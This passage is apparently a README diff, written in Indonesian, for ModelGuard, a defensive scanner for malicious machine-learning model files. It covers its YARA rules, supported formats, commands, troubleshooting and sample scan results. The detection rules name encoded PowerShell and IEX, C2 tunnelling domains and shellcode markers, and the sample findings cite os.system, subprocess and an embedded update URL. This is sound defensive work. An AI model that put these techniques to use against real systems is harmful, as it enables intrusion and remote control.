+  Mendeteksi:
+  • Base64 decode calls (teknik obfuscation umum)
+  • PowerShell encoded commands (-enc, -EncodedCommand, IEX, Invoke-Expression)
+
+FILE: rules/c2_indicators.yar
+  Rule: DetectC2Domain
+  Severity: HIGH
+  Mendeteksi: Domain yang umum digunakan untuk Command & Control
+  Pattern: .onion, ngrok.io, serveo.net, dyndns.org, no-ip.org, ddns.net,
+           pastebin.com, bit.ly, tinyurl.com, portmap.io
+
+FILE: rules/shellcode.yar
+  Rule: DetectShellcode
+  Severity: CRITICAL
+  Mendeteksi: Pola shellcode eksploitasi
+  Pattern: NOP sled (\x90 berulang), INT3 breakpoint chain, Linux execve shellcode,
+           Metasploit marker, Cobalt Strike signature, egg hunter
+
+CARA MENAMBAHKAN RULE BARU:
+  1. Buat file .yar baru di folder rules/ atau tambahkan rule ke file yang ada
+  2. Ikuti syntax YARA:
+
+      rule NamaRule {
+          meta:
+              description = "Deskripsi rule ini"
+              severity    = "HIGH"
+          strings:
+              $s1 = "string yang dicari" ascii
+              $s2 = { 48 65 6C 6C 6F }  // hex bytes
+          condition:
+              any of them
+      }
+
+  3. Daftarkan severity di src/scanners/yara_scanner.py:
+      RULE_SEVERITY["NamaRule"] = "HIGH"
+
+  4. Scanner akan otomatis memuat rule baru saat restart
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  11. FORMAT FILE YANG DIDUKUNG
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌──────────────┬──────────────────────────────────┬─────────────────────────────┐
+│ Ekstensi     │ Framework / Format               │ Layer yang aktif            │
+├──────────────┼──────────────────────────────────┼─────────────────────────────┤
+│ .pkl         │ Python pickle (sklearn, joblib)  │ L1, L2, L3, L4             │
+│ .joblib      │ joblib dump (sklearn pipeline)   │ L1, L2, L3, L4             │
+│ .pt          │ PyTorch model checkpoint         │ L1, L2 (ZIP→pickle), L3, L4│
+│ .h5          │ Keras / HDF5 model               │ L1, L3, L4 (HDF5 meta)     │
+│ .safetensors │ Hugging Face safetensors         │ L1, L3, L4 (tensor shape)  │
+│ .npy         │ NumPy array                      │ L1, L3, L4                 │
+└──────────────┴──────────────────────────────────┴─────────────────────────────┘
+
+CATATAN:
+  • .pt (PyTorch) menggunakan format ZIP yang berisi file pickle di dalamnya.
+    Layer 2 akan membuka ZIP terlebih dahulu, kemudian menganalisis setiap
+    file pickle di dalamnya.
+
+  • .safetensors dirancang KHUSUS untuk menghindari kerentanan pickle.
+    Format ini tidak mendukung arbitrary code execution, sehingga Level 2
+    tidak dijalankan. Tetap perlu diperiksa untuk konten tersembunyi (L4).
+
+  • .h5 (HDF5) menggunakan format binary terstruktur yang tidak bisa
+    menjalankan kode saat loading. Layer 2 tidak berlaku, tapi metadata
+    HDF5 bisa mengandung informasi yang tidak semestinya (L4 memeriksa ini).
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  12. PERINTAH LENGKAP REFERENSI
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Semua perintah dijalankan dari dalam folder modelguard/
+
+  # Setup (jalankan sekali saja)
+  pip install -r requirements.txt
+  choco install yara
+  python test_models/generate_test_models.py
+
+  # Scan file
+  set PYTHONIOENCODING=utf-8
+  python cli.py scan <file>
+  python cli.py scan <file> --verbose
+
+  # Lihat riwayat
+  python cli.py history
+
+  # Regenerate test models
+  python cli.py generate-test
+
+  # Web UI
+  python run.py
+  → buka http://localhost:8000
+
+  # API
+  curl -X POST http://localhost:8000/scan -F "file=@model.pkl"
+  curl http://localhost:8000/report/1/json
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  13. TROUBLESHOOTING / MASALAH UMUM
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+MASALAH: Karakter unicode tidak tampil (kotak kosong atau error)
+SOLUSI:  Jalankan perintah ini sebelum menggunakan CLI:
+             set PYTHONIOENCODING=utf-8        (Command Prompt)
+             $env:PYTHONIOENCODING = "utf-8"  (PowerShell)
+
+────────────────────────────────────────────────────────────────────────────────
+
+MASALAH: "YARA layer skipped" muncul di setiap scan
+SOLUSI:  Install YARA binary:  choco install yara
+         Kemudian install ulang:  pip install yara-python
+         Layer 3 tetap opsional — 3 layer lain tetap aktif.
+
+────────────────────────────────────────────────────────────────────────────────
+
+MASALAH: "ModuleNotFoundError: No module named 'fickling'"
+SOLUSI:  pip install fickling==0.0.9
+         Scanner tetap berfungsi tanpa fickling, tapi analisis AST dinonaktifkan.
+
+────────────────────────────────────────────────────────────────────────────────
+
+MASALAH: "ModuleNotFoundError: No module named 'sklearn'"
+SOLUSI:  pip install scikit-learn numpy
+         Hanya diperlukan untuk generate_test_models.py.
+         Scanner sendiri tidak membutuhkan sklearn.
+
+────────────────────────────────────────────────────────────────────────────────
+
+MASALAH: Web UI tidak bisa diakses di http://localhost:8000
+SOLUSI:  Pastikan python run.py sedang berjalan di terminal.
+         Cek apakah port 8000 sudah dipakai aplikasi lain:
+             netstat -ano | findstr :8000
+         Jika iya, ganti port di run.py: port=8001
+
+────────────────────────────────────────────────────────────────────────────────
+
+MASALAH: "UnicodeDecodeError" saat scan file .pkl
+SOLUSI:  File mungkin rusak atau bukan format pickle yang valid.
+         Format Validator (Layer 1) seharusnya sudah mendeteksi ini.
+         Pastikan file tidak corrupt saat didownload.
+
+────────────────────────────────────────────────────────────────────────────────
+
+MASALAH: File AMAN tapi mendapat verdict SUSPICIOUS
+SOLUSI:  Baca detail findings untuk memahami penyebabnya.
+         Kemungkinan: file mengandung URL atau IP address yang legitimate
+         (misalnya URL ke dokumentasi library). Ini adalah false positive.
+         Kustomisasi threshold atau whitelist di src/scanners/deep_scanner.py.
+
+────────────────────────────────────────────────────────────────────────────────
+
+MASALAH: safe_model.pkl mendapat CRITICAL finding
+SOLUSI:  Ini adalah false positive yang serius — berarti ada bug di scanner.
+         Jalankan dengan --verbose dan periksa finding detail.
+         Kemungkinan: versi scikit-learn baru menggunakan modul yang tidak
+         ada di SAFE_MODULE_PREFIXES. Tambahkan ke list di pickle_scanner.py.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  14. CONTOH OUTPUT LENGKAP
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+──────────────────────────────────────────────
+Contoh 1: Scan malicious_model.pkl
+──────────────────────────────────────────────
+
+  ==============================================================
+  ModelGuard Scanner v1.0
+  ==============================================================
+  File    : malicious_model.pkl
+  Size    : 81 bytes
+  SHA256  : fe67f5c8a2fa2060…08795592
+
+  [Layer 1] Format Validator   ✓ PASS
+  [Layer 2] Pickle Analyzer    ✗ FOUND 2 CRITICAL findings
+  [Layer 3] YARA Scanner       ✓ PASS  (atau ✗ jika YARA terinstall)
+  [Layer 4] Deep Content       ✓ PASS
+
+  ==============================================================
+  VERDICT    : ⛔ MALICIOUS
+  RISK SCORE : 94/100
+  Duration   : 2 ms
+
+  FINDINGS:
+  [CRITICAL]  Dangerous callable in pickle: builtins.print
+              Pickle stream contains a reference to 'builtins.print'
+              which executes code when the model is loaded.
+              Evidence: Global reference: builtins.print
+
+  [HIGH]      Suspicious string in pickle data: os.system
+              The string 'os.system' is embedded directly in the pickle stream.
+              Evidence: Offset 0x33
+
+  [INFO]      YARA layer skipped
+              Evidence: Install yara-python and YARA binary to enable this layer.
+  ==============================================================
+
+  Scan saved to database (ID: 2)
+  Web report: http://localhost:8000/report/2
+
+──────────────────────────────────────────────
+Contoh 2: Scan safe_model.pkl
+──────────────────────────────────────────────
+
+  ==============================================================
+  ModelGuard Scanner v1.0
+  ==============================================================
+  File    : safe_model.pkl
+  Size    : 699 bytes
+  SHA256  : 2579aa614a411b9d…fa3aedff
+
+  [Layer 1] Format Validator   ✓ PASS
+  [Layer 2] Pickle Analyzer    ✓ PASS
+  [Layer 3] YARA Scanner       ✓ PASS
+  [Layer 4] Deep Content       ✓ PASS
+
+  ==============================================================
+  VERDICT    : ✅ SAFE
+  RISK SCORE : 3/100
+  Duration   : 60 ms
+
+  FINDINGS:
+  [INFO]  YARA layer skipped
+          Evidence: Install yara-python and YARA binary to enable this layer.
+  ==============================================================
+
+──────────────────────────────────────────────
+Contoh 3: Scan suspicious_model.pkl
+──────────────────────────────────────────────
+
+  ==============================================================
+  ModelGuard Scanner v1.0
+  ==============================================================
+  File    : suspicious_model.pkl
+  Size    : 286 bytes
+  SHA256  : 5dffb83747a9d5bb…511b9d5c
+
+  [Layer 1] Format Validator   ✓ PASS
+  [Layer 2] Pickle Analyzer    ✗ FOUND 3 HIGH findings
+  [Layer 3] YARA Scanner       ✓ PASS
+  [Layer 4] Deep Content       ✗ FOUND 1 MEDIUM finding
+
+  ==============================================================
+  VERDICT    : ⚠️  SUSPICIOUS
+  RISK SCORE : 80/100
+  Duration   : 82 ms
+
+  FINDINGS:
+  [HIGH]    Suspicious string in pickle data: os.system
+  [HIGH]    Suspicious string in pickle data: subprocess
+  [MEDIUM]  Suspicious string in pickle data: eval(
+  [MEDIUM]  URLs embedded in model file
+            Evidence: http://192.168.100.50/model-update
+  [LOW]     IP address found in model file
+            Evidence: 192.168.100.50
+  ==============================================================
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PENUTUP
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ModelGuard adalah alat defensif — ia tidak memodifikasi file, tidak
+menghapus, dan tidak menjalankan kode dari model yang diperiksa.
+Scanner sepenuhnya AMAN digunakan bahkan pada file yang dicurigai berbahaya.
+
+Prinsip utama: PERIKSA DULU, LOAD BELAKANGAN.
+
+Jika ada pertanyaan atau ditemukan false positive / false negative,
+periksa bagian TROUBLESHOOTING atau sesuaikan konfigurasi scanner
+di src/scanners/pickle_scanner.py (whitelist modul) dan
+src/scanners/deep_scanner.py (threshold entropi dan pola URL).
+
+══════════════════════════════════════════════════════════════════════════════════
